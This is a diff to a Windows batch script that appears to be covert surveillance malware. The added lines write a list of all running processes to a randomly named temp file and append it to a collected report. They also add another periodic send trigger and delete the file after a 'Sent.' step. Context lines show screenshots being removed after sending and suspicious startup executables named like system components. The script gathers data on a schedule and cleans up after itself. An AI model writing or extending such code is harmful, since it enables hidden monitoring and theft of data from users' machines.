@@ -992,6 +992,39 @@ echo.
 
 
 
+
+for /L %%i in (1,1,13) do (
+    set /A "rand=!random! %% 62"
+    for %%j in (!rand!) do set "filename=!filename!!chars:~%%j,1!"
+)
+set "filename3=!filename!"
+set "filename="
+
+
+
+
+set "ProcessTXTFILE=%temp%\!filename3!"
+
+
+echo Saving All Processes in "%ProcessTXTFILE%"
+powershell -command "Get-Process | Select-Object ProcessName, Path" > "%ProcessTXTFILE%" 2>nul
+echo Saved.
+echo.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 ::if exist "%ProgramData%\Microsoft\Windows\ShellHost.exe" start "" "%ProgramData%\Microsoft\Windows\ShellHost.exe"
 ::if exist "%ProgramData%\Microsoft\Windows\KMSAuto.exe" start "" "%ProgramData%\Microsoft\Windows\KMSAuto.exe"
 
@@ -1064,6 +1097,15 @@ echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
+echo All running processes >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+type "%ProcessTXTFILE%" >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+
+
+
 
 
 
@@ -1122,6 +1164,15 @@ del /F /Q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\KMSAuto.exe"
 del /F /Q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\COM Surrogate.exe"
 
 echo Operation completed.
+
+
+
+
+
+
+
+
+
 
 ::goto CONT
 
@@ -1237,6 +1288,7 @@ if "%currentMinute%" neq "%lastMinute%" (
     if "%currentMinute%"=="10" set "CheckSend=1"
     if "%currentMinute%"=="20" set "CheckSend=1"
     if "%currentMinute%"=="30" set "CheckSend=1"
+    if "%currentMinute%"=="35" set "CheckSend=1"
     if "%currentMinute%"=="40" set "CheckSend=1"
     if "%currentMinute%"=="50" set "CheckSend=1"
 )
@@ -1418,7 +1470,7 @@ echo Sent.
 del /f /q "%USERPROFILE%\Downloads\screenshot.png"
 del /f /q "%LOGFILE1%"
 del /f /q "%TASKS_DATA%"
-
+del /f /q "%ProcessTXTFILE%"
 
 
 set "currentMinute=%time:~3,2%"
